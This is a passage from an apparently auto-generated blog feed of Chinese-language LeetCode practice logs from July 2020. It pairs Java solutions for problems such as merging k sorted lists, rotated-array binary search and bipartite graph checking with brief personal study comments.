class="hljs-keyword">int</span> n)</span> </span>&#123;         List&lt;String&gt; res = <span class="hljs-keyword">new</span> ArrayList();         recur(res,<span class="hljs-keyword">new</span> StringBuilder(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,n);         <span class="hljs-keyword">return</span> res;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(List&lt;String&gt; res, StringBuilder cur, <span class="hljs-keyword">int</span> open, <span class="hljs-keyword">int</span> close, <span class="hljs-keyword">int</span> max)</span> </span>&#123;        <span class="hljs-keyword">if</span>(cur.length() == max*<span class="hljs-number">2</span>) &#123;            res.add(cur.toString());            <span class="hljs-keyword">return</span> ;        &#125;        <span class="hljs-keyword">if</span>(open &lt; max) &#123;            cur.append(<span class="hljs-string">'('</span>);            recur(res,cur,open+<span class="hljs-number">1</span>,close,max);            cur.deleteCharAt(cur.length()-<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">if</span>(close &lt; open) &#123;            cur.append(<span class="hljs-string">')'</span>);            recur(res,cur,open,close+<span class="hljs-number">1</span>,max);            cur.deleteCharAt(cur.length()-<span class="hljs-number">1</span>);        &#125;    &#125;&#125;</code></pre></div><h3 id="合并K个排序链表"><a href="#合并K个排序链表" class="headerlink" title="合并K个排序链表"></a><a href="https://leetcode-cn.com/problems/merge-k-sorted-lists/" target="_blank" rel="noopener">合并K个排序链表</a></h3><p>合并两个链表和前面的那个方法一样，这里用的是分治的思路合并K个，官解中用优先队列也可以，Java中实现了优先队列的方法可以直接调用</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for singly-linked list.</span><span class="hljs-comment"> * public class ListNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     ListNode next;</span><span class="hljs-comment"> *     ListNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeKLists</span><span class="hljs-params">(ListNode[] lists)</span> </span>&#123;        <span class="hljs-keyword">if</span>(lists.length == <span class="hljs-number">0</span> || lists == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">return</span> merge(lists,<span class="hljs-number">0</span>,lists.length-<span class="hljs-number">1</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">merge</span><span class="hljs-params">(ListNode[] lists, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;        <span class="hljs-keyword">if</span>(left == right) <span class="hljs-keyword">return</span> lists[left];        <span class="hljs-keyword">int</span> mid = left+(right-left)/<span class="hljs-number">2</span>;        ListNode l1 = merge(lists,left,mid);        ListNode l2 = merge(lists,mid+<span class="hljs-number">1</span>,right);        <span class="hljs-keyword">return</span> mergeTwoLists(l1,l2);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;        <span class="hljs-keyword">if</span>(l1 == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> l2;        <span class="hljs-keyword">if</span>(l2 == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> l1;        <span class="hljs-keyword">if</span>(l1.val &lt;= l2.val) &#123;            l1.next = mergeTwoLists(l1.next,l2);            <span class="hljs-keyword">return</span> l1;        &#125;        <span class="hljs-keyword">else</span> &#123;            l2.next = mergeTwoLists(l2.next,l1);            <span class="hljs-keyword">return</span> l2;        &#125;    &#125;&#125;</code></pre></div><h3 id="下一个排列"><a href="#下一个排列" class="headerlink" title="下一个排列"></a><a href="https://leetcode-cn.com/problems/next-permutation/" target="_blank" rel="noopener">下一个排列</a></h3><p>题目一开始没太看懂。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nextPermutation</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> i = nums.length-<span class="hljs-number">2</span>;        <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span> &amp;&amp; nums[i]&gt;=nums[i+<span class="hljs-number">1</span>]) i--;        <span class="hljs-keyword">if</span>(i&gt;=<span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">int</span> j = nums.length-<span class="hljs-number">1</span>;            <span class="hljs-keyword">while</span>(j&gt;i &amp;&amp; nums[j]&lt;=nums[i]) j--;            swap(nums,i,j);        &#125;        reverse(nums,i);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reverse</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start)</span> </span>&#123;        <span class="hljs-keyword">int</span> i = start+<span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> j = nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(i &lt; j) &#123;            swap(nums,i,j);            i++;            j--;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;        <span class="hljs-keyword">int</span> tmp = nums[i];        nums[i] = nums[j];        nums[j] = tmp;    &#125;&#125;</code></pre></div><h3 id="搜索旋转排序数组"><a href="#搜索旋转排序数组" class="headerlink" title="搜索旋转排序数组"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/" target="_blank" rel="noopener">搜索旋转排序数组</a></h3><p>和之前找旋转点一个主要思路，<code>nums[left] &lt;= nums[mid]</code>需要加=号是因为如果target不在left到mid的区间需要<code>left=mid+1</code>，由于计算mid取整，所以mid和left是有可能一样的，没有等号就无法进入这条语句了</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;        <span class="hljs-keyword">int</span> left=<span class="hljs-number">0</span>, right=nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(left &lt;= right) &#123;            <span class="hljs-keyword">int</span> mid = (left+right)/<span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span> (nums[mid] == target) <span class="hljs-keyword">return</span> mid;            <span class="hljs-keyword">if</span>(nums[left] &lt;= nums[mid]) &#123;                <span class="hljs-keyword">if</span>(target&gt;=nums[left] &amp;&amp; target&lt;nums[mid]) right = mid-<span class="hljs-number">1</span>;                <span class="hljs-keyword">else</span> left=mid+<span class="hljs-number">1</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">if</span>(target&gt;nums[mid] &amp;&amp; target&lt;=nums[right]) left=mid+<span class="hljs-number">1</span>;                <span class="hljs-keyword">else</span> right=mid-<span class="hljs-number">1</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;    &#125;&#125;</code></pre></div><h3 id="在排序数组中查找元素的第一个和最后一个位置"><a href="#在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="在排序数组中查找元素的第一个和最后一个位置"></a><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/" target="_blank" rel="noopener">在排序数组中查找元素的第一个和最后一个位置</a></h3><p>二分的边界真的能把人写吐🤮，收藏一篇分析二分边界的文章：<a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/solution/er-fen-cha-zhao-suan-fa-xi-jie-xiang-jie-by-labula/" target="_blank" rel="noopener">labuladong</a></p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] searchRange(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;        <span class="hljs-keyword">if</span>(nums.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>&#125;;        <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>, j=nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(i&lt;=j) &#123;            <span class="hljs-keyword">int</span> m = (i+j)/<span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span>(nums[m]&lt;=target) i=m+<span class="hljs-number">1</span>;            <span class="hljs-keyword">else</span> j=m-<span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">if</span>(j&lt;<span class="hljs-number">0</span> || nums[j]!=target) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>&#125;;        <span class="hljs-keyword">int</span> right = j;        i=<span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(i&lt;=j) &#123;            <span class="hljs-keyword">int</span> m = (i+j)/<span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span>(nums[m]&lt;target) i=m+<span class="hljs-number">1</span>;            <span class="hljs-keyword">else</span> j=m-<span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;i,right&#125;;    &#125;&#125;</code></pre></div><h3 id="组合总和"><a href="#组合总和" class="headerlink" title="组合总和"></a><a href="https://leetcode-cn.com/problems/combination-sum/" target="_blank" rel="noopener">组合总和</a></h3><p>DFS添加和剪枝，先搞一个排序，注意为了不重复需要在循环中定义每次开始的循环位置。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="hljs-keyword">int</span>[] candidates, <span class="hljs-keyword">int</span> target) &#123;        List&lt;Integer&gt; curres = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();        Arrays.sort(candidates);        dfs(candidates,target,curres,<span class="hljs-number">0</span>);        <span class="hljs-keyword">return</span> res;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] candidates, <span class="hljs-keyword">int</span> target, List&lt;Integer&gt; curres, <span class="hljs-keyword">int</span> start)</span> </span>&#123;        <span class="hljs-keyword">if</span>(target == <span class="hljs-number">0</span>) &#123;            res.add(<span class="hljs-keyword">new</span> ArrayList&lt;&gt;(curres));            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=start;i&lt;candidates.length;i++) &#123;            <span class="hljs-keyword">if</span>(target-candidates[i] &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;            curres.add(candidates[i]);            dfs(candidates,target-candidates[i],curres,i);            curres.remove(curres.size()-<span class="hljs-number">1</span>);        &#125;    &#125;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;7-23至7-31做题记录&quot;&gt;&lt;a href=&quot;#7-23至7-31做题记录&quot; class=&quot;headerlink&quot; title=&quot;7.23至7.31做题记录&quot;&gt;&lt;/a&gt;7.23至7.31做题记录&lt;/h1&gt;&lt;p&gt;今天开始做HOT100的题目，之前的题目会用JS作为</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="HOT100" scheme="http://yoursite.com/tags/HOT100/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>7.21至7.22做题记录</title>
    <link href="http://yoursite.com/2020/07/21/7.21%E8%87%B37.22%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/21/7.21%E8%87%B37.22%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-21T02:57:16.000Z</published>
    <updated>2020-07-22T08:08:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="7-21至7-22做题记录"><a href="#7-21至7-22做题记录" class="headerlink" title="7.21至7.22做题记录"></a>7.21至7.22做题记录</h1><h3 id="不同的二叉搜索树2"><a href="#不同的二叉搜索树2" class="headerlink" title="不同的二叉搜索树2"></a><a href="https://leetcode-cn.com/problems/unique-binary-search-trees-ii/" target="_blank" rel="noopener">不同的二叉搜索树2</a></h3><p>与7.15号那个第一题不同在于那题只需要统计不同树的数量，这个是要创建树并全部返回，那个用dp这个用递归</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode() &#123;&#125;</span><span class="hljs-comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><span class="hljs-comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><span class="hljs-comment"> *         this.val = val;</span><span class="hljs-comment"> *         this.left = left;</span><span class="hljs-comment"> *         this.right = right;</span><span class="hljs-comment"> *     &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;TreeNode&gt; <span class="hljs-title">generateTrees</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();        <span class="hljs-keyword">return</span> create(<span class="hljs-number">1</span>,n);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;TreeNode&gt; <span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-keyword">int</span> start, <span class="hljs-keyword">int</span> end)</span> </span>&#123;        List&lt;TreeNode&gt; alltree = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();        <span class="hljs-keyword">if</span>(start &gt; end) &#123;            alltree.add(<span class="hljs-keyword">null</span>);            <span class="hljs-keyword">return</span> alltree;        &#125;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=start;i&lt;=end;i++) &#123;            List&lt;TreeNode&gt; left = create(start,i-<span class="hljs-number">1</span>);            List&lt;TreeNode&gt; right = create(i+<span class="hljs-number">1</span>,end);            <span class="hljs-keyword">for</span>(TreeNode treel:left) &#123;                <span class="hljs-keyword">for</span>(TreeNode treer:right) &#123;                    TreeNode root = <span class="hljs-keyword">new</span> TreeNode(i);                    root.left = treel;                    root.right = treer;                    alltree.add(root);                &#125;            &#125;        &#125;                <span class="hljs-keyword">return</span> alltree;    &#125;&#125;</code></pre></div><h3 id="求前N项的和"><a href="#求前N项的和" class="headerlink" title="求前N项的和"></a><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/" target="_blank" rel="noopener">求前N项的和</a></h3><p>不让用加减乘除和条件判断，K神说用逻辑运算符的短路效果控制递归的执行与否</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sumNums</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">boolean</span> x = n&gt;<span class="hljs-number">1</span> &amp;&amp; (n+=sumNums(n-<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span>;        <span class="hljs-keyword">return</span> n;    &#125;   &#125;</code></pre></div><h3 id="不用加减乘除做加法"><a href="#不用加减乘除做加法" class="headerlink" title="不用加减乘除做加法"></a><a href="https://leetcode-cn.com/problems/bu-yong-jia-jian-cheng-chu-zuo-jia-fa-lcof/" target="_blank" rel="noopener">不用加减乘除做加法</a></h3><p>K神写的位运算太吊了：<a href="https://leetcode-cn.com/problems/bu-yong-jia-jian-cheng-chu-zuo-jia-fa-lcof/solution/mian-shi-ti-65-bu-yong-jia-jian-cheng-chu-zuo-ji-7/" target="_blank" rel="noopener">Krahets</a></p><h3 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-zui-jin-gong-gong-zu-xian-lcof/" target="_blank" rel="noopener">二叉搜索树的最近公共祖先</a></h3><p>因为是搜索树所以通过节点的值判断p和q的位置：在两侧则当前为公共祖先，在同一侧则有当前节点大于二者或小于二者</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;        <span class="hljs-keyword">if</span>(p.val &gt; q.val) <span class="hljs-keyword">return</span> lowestCommonAncestor(root,q,p);        <span class="hljs-keyword">int</span> left=p.val, right=q.val;        <span class="hljs-keyword">return</span> dfs(root,left,right);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode root, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">if</span>(root.val&gt;=left &amp;&amp; root.val&lt;=right) <span class="hljs-keyword">return</span> root;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root.val &lt; left) <span class="hljs-keyword">return</span> dfs(root.right,left,right);        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> dfs(root.left,left,right);    &#125; &#125;</code></pre></div><h3 id="二叉树的最近公共祖先"><a href="#二叉树的最近公共祖先" class="headerlink" title="二叉树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/" target="_blank" rel="noopener">二叉树的最近公共祖先</a></h3><p>看的K神 :<a href="https://leetcode-cn.com/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/solution/mian-shi-ti-68-ii-er-cha-shu-de-zui-jin-gong-gon-7/" target="_blank" rel="noopener">Krahets</a>的答案，太tm吊了，我连简单题都不会做呜呜呜~~</p><p>至此，剑指offer的所有题目都做完了，明天开始做HOT100的题目。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;7-21至7-22做题记录&quot;&gt;&lt;a href=&quot;#7-21至7-22做题记录&quot; class=&quot;headerlink&quot; title=&quot;7.21至7.22做题记录&quot;&gt;&lt;/a&gt;7.21至7.22做题记录&lt;/h1&gt;&lt;h3 id=&quot;不同的二叉搜索树2&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    <category term="剑指offer" scheme="http://yoursite.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>7.16至7.20做题记录</title>
    <link href="http://yoursite.com/2020/07/16/7.16%E8%87%B37.20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/16/7.16%E8%87%B37.20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-16T06:57:40.000Z</published>
    <updated>2020-07-20T07:00:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="7-16至7-20做题记录"><a href="#7-16至7-20做题记录" class="headerlink" title="7.16至7.20做题记录"></a>7.16至7.20做题记录</h1><h3 id="判断二分图"><a href="#判断二分图" class="headerlink" title="判断二分图"></a><a href="https://leetcode-cn.com/problems/is-graph-bipartite/" target="_blank" rel="noopener">判断二分图</a></h3><p>看了题解，其实就是遍历图，用染色法在遍历的过程中，将相邻的节点分成不同颜色集合的，如果能分完就返回true，遇到相邻节点但是是一个颜色返回false，DFS\BFS都可以</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> UNCOLORED = <span class="hljs-number">0</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> RED = <span class="hljs-number">1</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> GREEN = <span class="hljs-number">2</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] color;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> valid;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isBipartite</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] graph)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = graph.length;        color = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        valid = <span class="hljs-keyword">true</span>;        Arrays.fill(color,UNCOLORED);        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n &amp;&amp; valid;i++) &#123;            <span class="hljs-keyword">if</span>(color[i] == UNCOLORED)                dfs(i,RED,graph);        &#125;        <span class="hljs-keyword">return</span> valid;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> cur, <span class="hljs-keyword">int</span> cur_co, <span class="hljs-keyword">int</span>[][] graph)</span> </span>&#123;        color[cur] = cur_co;        <span class="hljs-keyword">int</span> nei_co = color[cur]==RED?GREEN:RED;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> nei:graph[cur]) &#123;            <span class="hljs-keyword">if</span>(color[nei] == UNCOLORED) &#123;                dfs(nei,nei_co,graph);                <span class="hljs-keyword">if</span>(!valid) <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(color[nei] != nei_co) &#123;                valid = <span class="hljs-keyword">false</span>;                <span class="hljs-keyword">return</span>;            &#125;            &#125;    &#125;&#125;</code></pre></div><h3 id="滑动窗口的最大值"><a href="#滑动窗口的最大值" class="headerlink" title="滑动窗口的最大值"></a><a href="https://leetcode-cn.com/problems/hua-dong-chuang-kou-de-zui-da-zhi-lcof/" target="_blank" rel="noopener">滑动窗口的最大值</a></h3><p>这尼玛居然是简单难度。。。看K神题解用之前的含有min函数的栈那个方法去做，用队列保存一个最大值，这样每次窗口取最大值的时间复杂度就是O(1)</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] maxSlidingWindow(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k) &#123;        <span class="hljs-keyword">if</span>(nums.length==<span class="hljs-number">0</span> || k==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];        Deque&lt;Integer&gt; q = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length-k+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++) &#123;            <span class="hljs-keyword">while</span>(!q.isEmpty() &amp;&amp; q.peekLast()&lt;nums[i]) q.removeLast();            q.addLast(nums[i]);        &#125;        res[<span class="hljs-number">0</span>]=q.peekFirst();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=k; j &lt; nums.length; i++,j++) &#123; <span class="hljs-comment">// 形成窗口后</span>            <span class="hljs-keyword">if</span>(q.peekFirst() == nums[i]) q.removeFirst();            <span class="hljs-keyword">while</span>(!q.isEmpty() &amp;&amp; q.peekLast() &lt; nums[j]) q.removeLast();            q.addLast(nums[j]);            res[i+<span class="hljs-number">1</span>] = q.peekFirst();        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="搜索插入位置"><a href="#搜索插入位置" class="headerlink" title="搜索插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/" target="_blank" rel="noopener">搜索插入位置</a></h3><p>直接二分不解释</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">searchInsert</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;        <span class="hljs-keyword">int</span> l=<span class="hljs-number">0</span>, r=nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(l&lt;=r) &#123;            <span class="hljs-keyword">int</span> mid=l+(r-l)/<span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span>(nums[mid]&lt;target) l=mid+<span class="hljs-number">1</span>;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid]&gt;target) r=mid-<span class="hljs-number">1</span>;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> mid;         &#125;        <span class="hljs-keyword">return</span> l;    &#125;&#125;</code></pre></div><h3 id="队列的最大值"><a href="#队列的最大值" class="headerlink" title="队列的最大值"></a><a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/" target="_blank" rel="noopener">队列的最大值</a></h3><p>比较辅助队列和主队列的值是否相等时不能用==,需要用equals，思想和之前栈的那个题一样</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MaxQueue</span> </span>&#123;        Deque&lt;Integer&gt; q;    Deque&lt;Integer&gt; help_q;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MaxQueue</span><span class="hljs-params">()</span> </span>&#123;        q = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();        help_q = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();    &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">max_value</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">if</span>(q.isEmpty()) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;        <span class="hljs-keyword">return</span> help_q.peekFirst();    &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> </span>&#123;        q.addLast(value);        <span class="hljs-keyword">while</span>(!help_q.isEmpty() &amp;&amp; help_q.peekLast()&lt;value) help_q.removeLast();        help_q.addLast(value);    &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pop_front</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">if</span>(q.isEmpty()) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;        <span class="hljs-keyword">if</span>(q.peekFirst().equals(help_q.peekFirst())) help_q.removeFirst();        <span class="hljs-keyword">return</span> q.poll();    &#125;&#125;<span class="hljs-comment">/**</span><span 